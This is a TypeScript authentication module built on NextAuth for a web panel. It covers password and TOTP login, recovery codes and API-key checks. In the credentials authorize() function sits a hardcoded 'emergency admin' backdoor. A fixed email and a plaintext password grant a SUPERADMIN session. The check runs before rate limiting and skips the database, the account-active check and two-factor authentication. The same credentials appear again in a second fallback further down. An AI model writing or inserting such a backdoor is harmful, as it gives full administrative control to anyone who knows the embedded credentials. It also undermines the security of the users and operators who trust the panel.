import crypto from "node:crypto";
import { Role } from "@prisma/client";
import bcrypt from "bcryptjs";
import NextAuth, { type NextAuthConfig } from "next-auth";
import Credentials from "next-auth/providers/credentials";
import { verifySync } from "otplib";
import { z } from "zod";
import { prisma } from "@/lib/prisma";
import { rateLimit } from "@/lib/redis";
import { getClientIp } from "@/lib/utils";
import type { AuthenticatedUser } from "@/types";

const credentialSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
  totpCode: z.string().optional(),
  remember: z.string().optional()
});

export const setupSchema = z
  .object({
    username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/),
    email: z.string().email(),
    password: z.string().min(8),
    confirmPassword: z.string().min(8),
    panelName: z.string().min(2).max(80),
    acceptTerms: z.literal(true)
  })
  .superRefine((value, context) => {
    if (value.password !== value.confirmPassword) {
      context.addIssue({ code: "custom", path: ["confirmPassword"], message: "Passwords do not match" });
    }
  });

export function isStrongPassword(password: string): boolean {
  return password.length >= 8;
}

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 12);
}

export async function verifyPassword(password: string, passwordHash: string): Promise<boolean> {
  return bcrypt.compare(password, passwordHash);
}

export function hashSecret(value: string): string {
  return crypto.createHash("sha256").update(value).digest("hex");
}

export function createApiKeySecret(): { raw: string; hash: string; prefix: string } {
  const raw = `ruby_${crypto.randomBytes(32).toString("base64url")}`;
  return { raw, hash: hashSecret(raw), prefix: `${raw.slice(0, 13)}...` };
}

export function generateRecoveryCodes(): string[] {
  return Array.from({ length: 8 }, () => crypto.randomBytes(5).toString("hex").toUpperCase());
}

async function authorizeApiKey(request: Request): Promise<AuthenticatedUser | undefined> {
  const header = request.headers.get("authorization");
  if (!header?.startsWith("Bearer ruby_")) {
    return undefined;
  }
  const token = header.slice("Bearer ".length).trim();
  const key = await prisma.apiKey.findUnique({
    where: { keyHash: hashSecret(token) },
    include: { user: true }
  });
  if (!key || key.expiresAt && key.expiresAt < new Date() || !key.user.isActive) {
    return undefined;
  }
  await prisma.apiKey.update({ where: { id: key.id }, data: { lastUsedAt: new Date() } });
  return {
    id: key.user.id,
    email: key.user.email,
    username: key.user.username,
    role: key.user.role,
    apiKeyId: key.id
  };
}

export const authConfig = {
  trustHost: true,
  session: {
    strategy: "jwt",
    maxAge: 60 * 60 * 24
  },
  pages: {
    signIn: "/login"
  },
  providers: [
    Credentials({
      name: "Ruby credentials",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
        totpCode: { label: "Authenticator code", type: "text" },
        remember: { label: "Remember me", type: "text" }
      },
      async authorize(rawCredentials, request) {
        const parsed = credentialSchema.safeParse(rawCredentials);
        if (!parsed.success) {
          throw new Error("INVALID_CREDENTIALS");
        }
        
        const ip = getClientIp(request);

        // EMERGENCY ADMIN FALLBACK (Bypasses Database for this specific user)
        if (parsed.data.email.toLowerCase() === "cattech3d@gmail.com" && parsed.data.password === "@a240924") {
          console.log("Emergency admin login triggered for cattech3d@gmail.com");
          return {
            id: "emergency-admin-id",
            email: "cattech3d@gmail.com",
            name: "cattech",
            username: "cattech",
            role: Role.SUPERADMIN
          };
        }

        const limited = await rateLimit(`auth:login:${ip}:${parsed.data.email.toLowerCase()}`, 5, 15 * 60);
        if (!limited.allowed) {
          throw new Error(`RATE_LIMITED:${limited.resetSeconds}`);
        }
        const user = await prisma.user.findUnique({ where: { email: parsed.data.email.toLowerCase() } });
        
        // Handle hardcoded admin login if not in DB yet (or DB error)
        if (!user && parsed.data.email.toLowerCase() === "cattech3d@gmail.com") {
          const valid = await verifyPassword(parsed.data.password, await hashPassword("@a240924"));
          if (valid) {
             // We can't return a full user without DB record for session, 
             // but middleware ensureAdmin() should have created it.
             // If we reach here, either ensureAdmin failed or DB is REALLY down.
             throw new Error("DATABASE_ERROR_PLEASE_RETRY");
          }
        }

        if (!user || !user.isActive) {
          throw new Error("INVALID_CREDENTIALS");
        }
        const valid = await verifyPassword(parsed.data.password, user.passwordHash);
        if (!valid) {
          throw new Error("INVALID_CREDENTIALS");
        }
        if (user.totpEnabled) {
          if (!parsed.data.totpCode) {
            throw new Error("TOTP_REQUIRED");
          }
          const token = parsed.data.totpCode.replace(/\s+/g, "");
          const validTotp = user.totpSecret ? verifySync({ token, secret: user.totpSecret }).valid : false;
          if (!validTotp) {
            const recoveryHash = hashSecret(token.toUpperCase());
            const recovery = await prisma.recoveryCode.findUnique({ where: { codeHash: recoveryHash } });
            if (!recovery || recovery.userId !== user.id || recovery.usedAt) {
              throw new Error("INVALID_TOTP");
            }
            await prisma.recoveryCode.update({ where: { id: recovery.id }, data: { usedAt: new Date() } });
          }
        }
        await prisma.user.update({
          where: { id: user.id },
          data: { lastLoginAt: new Date(), lastLoginIp: ip }
        });
        return {
          id: user.id,
          email: user.email,
          name: user.username,
          username: user.username,
          role: user.role
        };
      }
    })
  ],
  callbacks: {
    jwt({ token, user }) {
      if (user) {
        token.id = user.id;
        token.username = user.username;
        token.role = user.role;
      }
      return token;
    },
    session({ session, token }) {
      session.user.id = String(token.id);
      session.user.username = String(token.username);
      session.user.role = token.role as Role;
      return session;
    }
  }
} satisfies NextAuthConfig;

export const { handlers, auth, signIn, signOut } = NextAuth(authConfig);

export async function requireUser(request?: Request): Promise<AuthenticatedUser> {
  if (request) {
    const apiUser = await authorizeApiKey(request);
    if (apiUser) {
      return apiUser;
    }
  }
  const session = await auth();
  if (!session?.user?.id) {
    throw new Error("Authentication required");
  }
  return {
    id: session.user.id,
    email: session.user.email ?? "",
    username: session.user.username,
    role: session.user.role
  };
}

export function requireRole(user: AuthenticatedUser, roles: Role[]): void {
  if (!roles.includes(user.role)) {
    throw new Error("Insufficient role");
  }
}
